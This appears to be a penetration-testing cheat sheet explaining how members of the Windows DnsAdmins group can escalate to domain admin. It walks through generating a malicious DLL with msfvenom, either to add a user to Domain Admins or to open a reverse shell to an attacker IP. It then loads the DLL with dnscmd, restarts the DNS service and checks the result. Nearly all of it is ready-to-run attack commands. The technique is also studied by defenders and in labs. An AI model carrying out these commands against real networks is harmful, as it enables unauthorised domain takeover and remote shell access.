# DnsAdmins

Members of the [**DnsAdmins**](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) group possess access to DNS information on the network, which can be exploited for privilege escalation. By leveraging this group’s permissions, we can create a malicious DLL that adds a user to the **Domain Admins** group or provides a reverse shell.

#### **Generating Malicious DLLs with msfvenom**

1.  **Creating a DLL to Add a User to the Domain Admins Group**: To create a DLL that executes a command to add a user to the **Domain Admins** group, use the following command:

    ```bash
    msfvenom -p windows/x64/exec cmd='net group "Domain Admins" netadm /add /domain' -f dll -o adduser.dll
    ```

    This command creates a DLL named `adduser.dll`, which will execute the command to add the specified user (`netadm`) to the **Domain Admins** group.
2.  **Creating a DLL for a Reverse Shell**: To generate a DLL that provides a reverse shell, use the following command:

    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.01 LPORT=5555 -f dll > dbs.dll
    ```

    This command creates a DLL named `dbs.dll` that will establish a reverse shell connection back to the attacker's machine.

#### **Loading the DLL into the DNS Service**

After generating the desired DLL, transfer it to the target machine. Next, load the DLL into the DNS service by executing the following command:

```powershell
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

This command configures the DNS server to load the `adduser.dll` the next time the service starts.

#### **Starting the DNS Service**

To execute the DLL, the DNS service needs to be restarted. Run the following commands:

```powershell
sc.exe stop dns
sc.exe start dns
```

If you lack the necessary permissions to start or stop the DNS service, you may need to wait until the service is restarted naturally, which could occur due to maintenance or other scheduled tasks.

#### **Verification**

To confirm that the user has been successfully added to the **Domain Admins** group, execute the following command:

```powershell
net group "Domain Admins" /dom
```

This command will display the members of the **Domain Admins** group, allowing you to verify that the new user (`netadm`) has been added successfully.
